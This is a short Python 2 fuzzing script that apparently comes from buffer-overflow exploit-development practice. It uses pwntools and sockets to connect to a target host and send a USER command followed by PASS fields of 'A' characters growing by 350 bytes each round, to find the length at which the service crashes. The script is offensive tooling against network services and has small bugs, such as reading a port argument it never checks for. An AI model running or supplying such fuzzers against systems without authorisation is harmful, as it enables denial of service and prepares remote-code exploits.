#!/usr/bin/env python
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
        print '\n[!] Usage: python ' + sys.argv[0] + ' <ip-address>\n'
        sys.exit(0)

# Global variables
ip_address = sys.argv[1]
rport = sys.argv[2]

if __name__ == '__main__':
  bufer = ["A"]
  counter = 350

  while len(bufer) < 32:
    bufer.append("A"*counter)
    counter += 350

  p1 = log.progress("Data")

  for strings in bufer:
    try:
      p1.status("Sending %s bytes" % len(strings))
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip_address, rport))

      s.recv(1024)
      
      s.send("USER zerocool\r\n")
      s.recv(1024)
      s.send("PASS " + strings + '\r\n')
      s.recv(1024)
    except:
      print "\n[!] An error has occurred. Failed conection\n"
      sys.exit(1)
